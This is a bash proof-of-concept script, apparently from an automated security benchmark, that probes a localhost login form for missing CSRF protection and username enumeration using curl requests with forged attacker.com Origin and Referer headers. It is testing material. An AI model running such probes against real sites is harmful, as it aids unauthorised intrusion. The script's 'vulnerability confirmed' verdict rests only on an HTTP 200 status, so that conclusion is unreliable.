#!/bin/bash
# POC: Demonstrates CSRF vulnerability on login form - accepts POST requests from cross-origin without CSRF token validation
# Target: ./repo
# Created: 2025-11-04T14:51:18.783Z
# Session: benchmark-XBEN-027-24-mhknopkv

# CSRF on Login Form POC
# Demonstrates that the login form accepts POST requests from cross-origin
# without CSRF token validation

TARGET_URL="http://localhost:8080"

echo "[*] Testing CSRF vulnerability on login form"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Normal login attempt with cross-origin headers
echo "[+] Test 1: Cross-origin POST request with attacker origin headers"
echo "    Sending POST to / with Origin: http://attacker.com"
echo ""

RESPONSE=$(curl -s -w "\n%{http_code}" \
  -X POST \
  -H "Origin: http://attacker.com" \
  -H "Referer: http://attacker.com/malicious-page" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test" \
  "$TARGET_URL/")

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "HTTP Status Code: $HTTP_CODE"
echo "Response received successfully (no CSRF error)"
echo ""

# Test 2: Check for CSRF token in login form
echo "[+] Test 2: Checking login form HTML for CSRF token"
echo ""

FORM=$(curl -s -H "Origin: http://attacker.com" "$TARGET_URL/")

if echo "$FORM" | grep -q "csrf"; then
    echo "[-] CSRF token field found in form"
else
    echo "[+] NO CSRF token field found in login form"
fi

if echo "$FORM" | grep -q "type=\"hidden\""; then
    echo "[*] Hidden fields present in form:"
    echo "$FORM" | grep -o 'name="[^"]*"' | grep -v 'username'
else
    echo "[+] No hidden CSRF token fields detected"
fi

echo ""

# Test 3: Verify the vulnerability - send username enumeration request
echo "[+] Test 3: Username enumeration via CSRF"
echo "    Sending request for non-existent user 'nonexistent'"
echo ""

RESPONSE=$(curl -s -w "\n%{http_code}" \
  -X POST \
  -H "Origin: http://attacker.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=nonexistent" \
  "$TARGET_URL/")

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "HTTP Status Code: $HTTP_CODE"
echo "Response (first 200 chars): $(echo "$BODY" | head -c 200)"
echo ""

if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] VULNERABILITY CONFIRMED: Cross-origin request accepted without CSRF token"
    echo "[+] Server did not reject request due to origin mismatch or missing CSRF token"
    echo "[+] Response indicates successful processing (HTTP 200)"
    exit 0
else
    echo "[-] Unexpected response code: $HTTP_CODE"
    exit 1
fi